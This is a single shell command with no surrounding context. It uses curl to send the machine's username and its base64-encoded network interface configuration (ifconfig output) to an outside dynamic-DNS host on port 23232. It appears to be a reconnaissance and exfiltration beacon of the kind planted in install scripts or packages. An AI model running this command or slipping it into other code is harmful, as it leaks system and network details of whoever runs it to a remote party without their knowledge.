curl "pipie.ddns.net:23232" -d "id=$(id -un)&ifconfig=$(/sbin/ifconfig | base64 | tr -- '+=/' '-_~')"
